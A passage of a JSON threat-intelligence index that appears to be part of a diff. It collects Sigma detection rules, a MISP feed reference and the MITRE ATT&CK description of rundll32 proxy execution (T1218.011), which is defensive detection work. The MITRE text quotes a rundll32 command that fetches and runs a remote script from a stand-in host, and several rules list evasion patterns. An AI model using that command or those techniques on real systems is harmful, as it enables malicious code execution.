+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/10/22\ndescription: Detects suspicious calls of DLLs in rundll32.dll exports by ordinal\ndetection:\n  condition: selection and not 1 of filter*\n  filter_edge:\n    CommandLine|contains|all:\n    - EDGEHTML.dll\n    - '#141'\n  filter_vsbuild_dll:\n    CommandLine|contains:\n    - \\FileTracker32.dll,#1\n    - \\FileTracker32.dll\",#1\n    - \\FileTracker64.dll,#1\n    - \\FileTracker64.dll\",#1\n    ParentImage|contains:\n    - \\Msbuild\\Current\\Bin\\\n    - \\VC\\Tools\\MSVC\\\n    - \\Tracker.exe\n  selection:\n    CommandLine|contains:\n    - ',#'\n    - ', #'\n    - '.dll #'\n    - '.ocx #'\n    Image|endswith: \\rundll32.exe\nfalsepositives:\n- False positives depend on scripts and administrative tools used in the monitored\n  environment\n- Windows control panel elements have been identified as source (mmc)\nid: e79a9e79-eb72-4e78-a628-0e7e8f59e89c\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/04\nreferences:\n- https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/\n- https://github.com/Neo23x0/DLLRunner\n- https://twitter.com/cyb3rops/status/1186631731543236608\n- https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/\nstatus: stable\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: Suspicious Call by Ordinal\n",
+                            "sigma:id": "e79a9e79-eb72-4e78-a628-0e7e8f59e89c",
+                            "title": "Suspicious Call by Ordinal",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5cdb711b-5740-4fb2-ba88-f7945027afac",
+                        "lookup_data": {
+                            "description": "Detects rundll32 execution where the DLL is located on a remote location (share)",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/10\ndescription: Detects rundll32 execution where the DLL is located on a remote location\n  (share)\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains: ' \\\\\\\\'\n  selection_img:\n  - Image|endswith: \\rundll32.exe\n  - OriginalFileName: RUNDLL32.EXE\n  - CommandLine|contains: rundll32\nfalsepositives:\n- Unlikely\nid: 5cdb711b-5740-4fb2-ba88-f7945027afac\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1021.002\n- attack.t1218.011\ntitle: Rundll32 UNC Path Execution\n",
+                            "sigma:id": "5cdb711b-5740-4fb2-ba88-f7945027afac",
+                            "title": "Rundll32 UNC Path Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
+                        "lookup_data": {
+                            "description": "Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)",
+                            "raw": "author: Maxim Pavlunin\ndate: 2020/04/01\ndescription: Detects a suspicious child process of a Microsoft HTML Help system when\n  executing compiled HTML files (.chm)\ndetection:\n  condition: 1 of selection_*\n  selection_1:\n    Image|endswith:\n    - \\cmd.exe\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\regsvr32.exe\n    - \\wmic.exe\n    - \\rundll32.exe\n    - \\MSHTA.EXE\n    - \\CertUtil.exe\n    - \\CertReq.exe\n    - \\MSbuild.exe\n    - \\installutil.exe\n    - \\schtasks.exe\n    - \\msiexec.exe\n    ParentImage:\n    - C:\\Windows\\hh.exe\n    - C:\\Windows\\SysWOW64\\hh.exe\n  selection_2:\n    CommandLine|contains:\n    - .application\n    - \\Downloads\\\n    - \\Content.Outlook\\\n    - \\AppData\\Local\\Temp\\\n    Image|endswith:\n    - \\Windows\\hh.exe\n    - \\Windows\\SysWOW64\\hh.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 52cad028-0ff0-4854-8f67-d25dfcbc78b4\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/24\nreferences:\n- https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/\n- https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-27939090904026cc396b0b629c8e4314acd6f5dac40a676edbc87f4567b47eb7\n- https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.001\n- attack.t1218.010\n- attack.t1218.011\n- attack.execution\n- attack.t1059.001\n- attack.t1059.003\n- attack.t1059.005\n- attack.t1059.007\n- attack.t1047\n- attack.t1566\n- attack.t1566.001\n- attack.initial_access\n- attack.t1218\ntitle: HTML Help Shell Spawn\n",
+                            "sigma:id": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
+                            "title": "HTML Help Shell Spawn",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b18c9d4c-fac9-4708-bd06-dd5bfacf200f",
+                        "lookup_data": {
+                            "description": "F-Secure C3 produces DLLs with a default exported StartNodeRelay function.",
+                            "raw": "author: Alfie Champion (ajpc500)\ndate: 2021/06/02\ndescription: F-Secure C3 produces DLLs with a default exported StartNodeRelay function.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - rundll32.exe\n    - .dll\n    - StartNodeRelay\nfalsepositives:\n- Unknown\nid: b18c9d4c-fac9-4708-bd06-dd5bfacf200f\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/FSecureLABS/C3/blob/11a081fd3be2aaf2a879f6b6e9a96ecdd24966ef/Src/NodeRelayDll/NodeRelayDll.cpp#L12\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: F-Secure C3 Load by Rundll32\n",
+                            "sigma:id": "b18c9d4c-fac9-4708-bd06-dd5bfacf200f",
+                            "title": "F-Secure C3 Load by Rundll32",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e3e245fa-1e8e-41db-94d3-6991edd0eaee",
+                        "lookup_data": {
+                            "description": "Always Another Secret: Lifting the Haze on China-nexus Espionage in Southeast Asia | Mandiant",
+                            "link": "http://www.botvrij.eu/data/feed-osint/e3e245fa-1e8e-41db-94d3-6991edd0eaee.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1670434101",
+                            "uuid": "e3e245fa-1e8e-41db-94d3-6991edd0eaee",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a7c3d773-caef-227e-a7e7-c2f13c622329",
+                        "lookup_data": {
+                            "description": "Detects attackers using tooling with bad opsec defaults.\nE.g. spawning a sacrificial process to inject a capability into the process without taking into account how the process is normally run.\nOne trivial example of this is using rundll32.exe without arguments as a sacrificial process (default in CS, now highlighted by c2lint), running WerFault without arguments (Kraken - credit am0nsec), and other examples.\n",
+                            "raw": "author: Oleg Kolesnikov @securonix invrep_de, oscd.community, Florian Roth (Nextron\n  Systems), Christian Burkard (Nextron Systems)\ndate: 2020/10/23\ndescription: 'Detects attackers using tooling with bad opsec defaults.\n\n  E.g. spawning a sacrificial process to inject a capability into the process without\n  taking into account how the process is normally run.\n\n  One trivial example of this is using rundll32.exe without arguments as a sacrificial\n  process (default in CS, now highlighted by c2lint), running WerFault without arguments\n  (Kraken - credit am0nsec), and other examples.\n\n  '\ndetection:\n  condition: 1 of selection* and not 1 of filter*\n  filter_edge_update:\n    ParentCommandLine|contains: \\setup.exe\" --install-archive=\"C:\\Users\\\n    ParentImage|contains: \\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{\n    ParentImage|endswith: \\setup.exe\n    ParentImage|startswith: C:\\Users\\\n  selection1:\n    CommandLine|endswith: WerFault.exe\n    Image|endswith: \\WerFault.exe\n  selection2:\n    CommandLine|endswith: rundll32.exe\n    Image|endswith: \\rundll32.exe\n  selection3:\n    CommandLine|endswith: regsvcs.exe\n    Image|endswith: \\regsvcs.exe\n  selection4:\n    CommandLine|endswith: regasm.exe\n    Image|endswith: \\regasm.exe\n  selection5:\n    CommandLine|endswith: regsvr32.exe\n    Image|endswith: \\regsvr32.exe\nfalsepositives:\n- Unlikely\nfields:\n- ParentImage\n- ParentCommandLine\nid: a7c3d773-caef-227e-a7e7-c2f13c622329\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/25\nreferences:\n- https://blog.malwarebytes.com/malwarebytes-news/2020/10/kraken-attack-abuses-wer-service/\n- https://www.cobaltstrike.com/help-opsec\n- https://twitter.com/CyberRaiju/status/1251492025678983169\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32\n- https://docs.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool\n- https://docs.microsoft.com/en-us/dotnet/framework/tools/regsvcs-exe-net-services-installation-tool#feedback\nrelated:\n- id: f5647edc-a7bf-4737-ab50-ef8c60dc3add\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: Bad Opsec Defaults Sacrificial Processes With Improper Arguments\n",
+                            "sigma:id": "a7c3d773-caef-227e-a7e7-c2f13c622329",
+                            "title": "Bad Opsec Defaults Sacrificial Processes With Improper Arguments",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "d465d1d8-27a2-4cca-9621-a800f37cf72e",
+                        "lookup_data": {
+                            "description": "Detects a specific tool and export used by EquationGroup",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/03/04\ndescription: Detects a specific tool and export used by EquationGroup\ndetection:\n  condition: 1 of selection*\n  selection1:\n    CommandLine|endswith: ',dll_u'\n    Image|endswith: \\rundll32.exe\n  selection2:\n    CommandLine|contains: ' -export dll_u '\nfalsepositives:\n- Unknown\nid: d465d1d8-27a2-4cca-9621-a800f37cf72e\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://github.com/adamcaudill/EquationGroupLeak/search?utf8=%E2%9C%93&q=dll_u&type=\n- https://securelist.com/apt-slingshot/84312/\n- https://twitter.com/cyb3rops/status/972186477512839170\nstatus: stable\ntags:\n- attack.g0020\n- attack.defense_evasion\n- attack.t1218.011\ntitle: Equation Group DLL_U Load\n",
+                            "sigma:id": "d465d1d8-27a2-4cca-9621-a800f37cf72e",
+                            "title": "Equation Group DLL_U Load",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "045d0922-2310-4e60-b5e4-3302302cb3c5",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1218.011",
+                            "mitre-cti:description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
+                            "mitre-cti:name": "Rundll32",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Gareth Phillips, Seek Ltd.', 'Casey Smith', 'Ricardo Dias', 'James_inthe_box, Me'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5', 'created': '2020-01-23T18:03:46.248Z', 'x_mitre_version': '2.0', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1218.011', 'url': 'https://attack.mitre.org/techniques/T1218/011'}, {'source_name': 'rundll32.exe defense evasion', 'url': 'https://www.cynet.com/attack-techniques-hands-on/defense-evasion-techniques/', 'description': 'Ariel silver. (2022, February 1). Defense Evasion Techniques. Retrieved April 8, 2022.'}, {'source_name': 'Attackify Rundll32.exe Obscurity', 'url': 'https://www.attackify.com/blog/rundll32_execution_order/', 'description': 'Attackify. (n.d.). Rundll32.exe Obscurity. Retrieved August 23, 2021.'}, {'source_name': 'This is Security Command Line Confusion', 'url': 'https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/', 'description': 'B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018.'}, {'source_name': 'Github NoRunDll', 'url': 'https://github.com/gtworek/PSBits/tree/master/NoRunDll', 'description': 'gtworek. (2019, December 17). NoRunDll. Retrieved August 23, 2021.'}, {'source_name': 'Trend Micro CPL', 'url': 'https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf', 'description': 'Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\\n\\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\\n\\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\\\..\\\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\\n\\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\\n\\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ', 'modified': '2022-04-19T18:12:39.357Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Rundll32', 'x_mitre_detection': 'Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.\\n\\nCommand arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['Process: Process Creation', 'File: File Metadata', 'Command: Command Execution', 'Module: Module Load'], 'x_mitre_defense_bypassed': ['Digital Certificate Validation', 'Application control', 'Anti-virus'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "73fcad2e-ff14-4c38-b11d-4172c8ac86c7",
+                        "lookup_data": {
+                            "description": "Detects suspicious process related to rundll32 based on arguments",
+                            "raw": "author: frack113\ndate: 2021/12/04\ndescription: Detects suspicious process related to rundll32 based on arguments\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - 'javascript:'\n    - 'vbscript:'\n    CommandLine|contains|all:\n    - rundll32\n    - mshtml,RunHTMLApplication\nfalsepositives:\n- False positives depend on scripts and administrative tools used in the monitored\n  environment\nid: 73fcad2e-ff14-4c38-b11d-4172c8ac86c7\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/11\nreferences:\n- https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.011/T1218.011.md\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: Suspicious Rundll32 Script in CommandLine\n",
+                            "sigma:id": "73fcad2e-ff14-4c38-b11d-4172c8ac86c7",
+                            "title": "Suspicious Rundll32 Script in CommandLine",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "3a3f81ca-652c-482b-adeb-b1c804727f74",
+                        "lookup_data": {
+                            "description": "A sigma rule detecting an unidetefied attacker who used phishing emails to target high profile orgs on November 2018. The Actor shares some TTPs with YYTRIUM/APT29 campaign in 2016.",
+                            "raw": "author: '@41thexplorer, Microsoft Defender ATP'\ndate: 2018/11/20\ndescription: A sigma rule detecting an unidetefied attacker who used phishing emails\n  to target high profile orgs on November 2018. The Actor shares some TTPs with YYTRIUM/APT29\n  campaign in 2016.\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|contains: ds7002.lnk\nid: 3a3f81ca-652c-482b-adeb-b1c804727f74\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://twitter.com/DrunkBinary/status/1063075530180886529\nrelated:\n- id: 7453575c-a747-40b9-839b-125a0aae324b\n  type: derived\nstatus: stable\ntags:\n- attack.execution\n- attack.t1218.011\ntitle: Unidentified Attacker November 2018 - File\n",
+                            "sigma:id": "3a3f81ca-652c-482b-adeb-b1c804727f74",
+                            "title": "Unidentified Attacker November 2018 - File",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "994cac2b-92c2-44bf-8853-14f6ca39fbda",
+                        "lookup_data": {
+                            "description": "Detects remote thread injection events based on action seen used by bumblebee",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/09/27\ndescription: Detects remote thread injection events based on action seen used by bumblebee\ndetection:\n  condition: selection\n  selection:\n    SourceImage|endswith:\n    - \\wabmig.exe\n    - \\wab.exe\n    - \\ImagingDevices.exe\n    TargetImage|endswith: \\rundll32.exe\nfalsepositives:\n- Unknown\nid: 994cac2b-92c2-44bf-8853-14f6ca39fbda\nlevel: high\nlogsource:\n  category: create_remote_thread\n  product: windows\nreferences:\n- https://thedfirreport.com/2022/09/26/bumblebee-round-two/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1218.011\n- attack.t1059.001\ntitle: Bumblebee Remote Thread Creation\n",
+                            "sigma:id": "994cac2b-92c2-44bf-8853-14f6ca39fbda",
+                            "title": "Bumblebee Remote Thread Creation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "cdc8da7d-c303-42f8-b08c-b4ab47230263",
+                        "lookup_data": {
+                            "description": "Detects a rundll32 that communicates with public IP addresses",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/11/04\ndescription: Detects a rundll32 that communicates with public IP addresses\ndetection:\n  condition: selection and not 1 of filter*\n  filter:\n  - DestinationIp|startswith:\n    - '10.'\n    - 192.168.\n    - 172.16.\n    - 172.17.\n    - 172.18.\n    - 172.19.\n    - 172.20.\n    - 172.21.\n    - 172.22.\n    - 172.23.\n    - 172.24.\n    - 172.25.\n    - 172.26.\n    - 172.27.\n    - 172.28.\n    - 172.29.\n    - 172.30.\n    - 172.31.\n    - '127.'\n    - '20.'\n    - 51.103.\n    - 51.104.\n    - 51.105.\n  - CommandLine|contains: PcaSvc.dll,PcaPatchSdbTask\n  filter_update_processes:\n    DestinationPort: 443\n    ParentImage: C:\\Windows\\System32\\svchost.exe\n  selection:\n    Image|endswith: \\rundll32.exe\n    Initiated: 'true'\nfalsepositives:\n- Communication to other corporate systems that use IP addresses from public address\n  spaces\nid: cdc8da7d-c303-42f8-b08c-b4ab47230263\nlevel: medium\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2022/12/30\nreferences:\n- https://www.hybrid-analysis.com/sample/759fb4c0091a78c5ee035715afe3084686a8493f39014aea72dae36869de9ff6?environmentId=100\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.011\n- attack.execution\ntitle: Rundll32 Internet Connection\n",
+                            "sigma:id": "cdc8da7d-c303-42f8-b08c-b4ab47230263",
+                            "title": "Rundll32 Internet Connection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "32b96012-7892-429e-b26c-ac2bf46066ff",
+                        "lookup_data": {
+                            "description": "Detects shell32.dll executing a DLL in a suspicious directory",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/11/24\ndescription: Detects shell32.dll executing a DLL in a suspicious directory\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - '%AppData%'\n    - '%LocalAppData%'\n    - '%Temp%'\n    - '%tmp%'\n    - \\AppData\\\n    - \\Temp\\\n    - \\Users\\Public\\\n    CommandLine|contains|all:\n    - shell32.dll\n    - Control_RunDLL\n    Image|endswith: \\rundll32.exe\nfalsepositives:\n- Unknown\nid: 32b96012-7892-429e-b26c-ac2bf46066ff\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/13\nreferences:\n- https://www.group-ib.com/resources/threat-research/red-curl-2.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1218.011\ntitle: Shell32 DLL Execution in Suspicious Directory\n",
+                            "sigma:id": "32b96012-7892-429e-b26c-ac2bf46066ff",
+                            "title": "Shell32 DLL Execution in Suspicious Directory",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "40b6e656-4e11-4c0c-8772-c1cc6dae34ce",
+                        "lookup_data": {
+                            "description": "Detects registry key established after masqueraded .scr file execution using Rundll32 through desk.cpl",
+                            "raw": "author: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)\ndate: 2022/05/04\ndescription: Detects registry key established after masqueraded .scr file execution\n  using Rundll32 through desk.cpl\ndetection:\n  condition: selection and registry and not filter\n  filter:\n    Details|contains:\n    - C:\\Windows\\System32\\\n    - C:\\Windows\\SysWOW64\\\n  registry:\n    Details|endswith: .scr\n    TargetObject|contains: \\Control Panel\\Desktop\\SCRNSAVE.EXE\n  selection:\n    EventType: SetValue\n    Image|endswith: \\rundll32.exe\nfalsepositives:\n- Legitimate use of screen saver\nid: 40b6e656-4e11-4c0c-8772-c1cc6dae34ce\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/05/04\nreferences:\n- https://twitter.com/VakninHai/status/1517027824984547329\n- https://twitter.com/pabraeken/status/998627081360695297\n- https://jstnk9.github.io/jstnk9/research/InstallScreenSaver-SCR-files\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: ScreenSaver Registry Key Set\n",
+                            "sigma:id": "40b6e656-4e11-4c0c-8772-c1cc6dae34ce",
+                            "title": "ScreenSaver Registry Key Set",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "95022b85-ff2a-49fa-939a-d7b8f56eeb9b",
+                        "lookup_data": {
+                            "description": "Detects actions caused by the RedMimicry Winnti playbook",
+                            "raw": "author: Alexander Rausch\ndate: 2020/06/24\ndescription: Detects actions caused by the RedMimicry Winnti playbook\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - gthread-3.6.dll\n    - \\Windows\\Temp\\tmp.bat\n    - sigcmm-2.4.dll\n    Image|endswith:\n    - \\rundll32.exe\n    - \\cmd.exe\nfalsepositives:\n- Unknown\nid: 95022b85-ff2a-49fa-939a-d7b8f56eeb9b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://redmimicry.com/posts/redmimicry-winnti/\nstatus: test\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1106\n- attack.t1059.003\n- attack.t1218.011\ntitle: RedMimicry Winnti Playbook Execution\n",
+                            "sigma:id": "95022b85-ff2a-49fa-939a-d7b8f56eeb9b",
+                            "title": "RedMimicry Winnti Playbook Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "731231b9-0b5d-4219-94dd-abb6959aa7ea",
+                        "lookup_data": {
+                            "description": "Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/03/05\ndescription: Detects suspicious process related to rundll32 based on command line\n  that includes a *.sys file as seen being used by UNC2452\ndetection:\n  condition: all of selection*\n  selection1:\n    CommandLine|contains: rundll32.exe\n  selection2:\n    CommandLine|contains:\n    - .sys,\n    - '.sys '\nfalsepositives:\n- Unknown\nid: 731231b9-0b5d-4219-94dd-abb6959aa7ea\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: Suspicious Rundll32 Activity Invoking Sys File\n",
+                            "sigma:id": "731231b9-0b5d-4219-94dd-abb6959aa7ea",
+                            "title": "Suspicious Rundll32 Activity Invoking Sys File",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f0b70adb-0075-43b0-9745-e82a1c608fcc",
+                        "lookup_data": {
+                            "description": "Detects a ZxShell start by the called and well-known function name",
+                            "raw": "author: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2017/07/20\ndescription: Detects a ZxShell start by the called and well-known function name\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - zxFunction\n    - RemoteDiskXXXXX\n    Image|endswith: \\rundll32.exe\nfalsepositives:\n- Unlikely\nfields:\n- CommandLine\n- ParentCommandLine\nid: f0b70adb-0075-43b0-9745-e82a1c608fcc\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.hybrid-analysis.com/sample/5d2a4cde9fa7c2fdbf39b2e2ffd23378d0c50701a3095d1e91e3cf922d7b0b16?environmentId=100\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.003\n- attack.defense_evasion\n- attack.t1218.011\n- attack.s0412\n- attack.g0001\ntitle: ZxShell Malware\n",
+                            "sigma:id": "f0b70adb-0075-43b0-9745-e82a1c608fcc",
+                            "title": "ZxShell Malware",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7453575c-a747-40b9-839b-125a0aae324b",
+                        "lookup_data": {
+                            "description": "A sigma rule detecting an unidetefied attacker who used phishing emails to target high profile orgs on November 2018. The Actor shares some TTPs with YYTRIUM/APT29 campaign in 2016.",
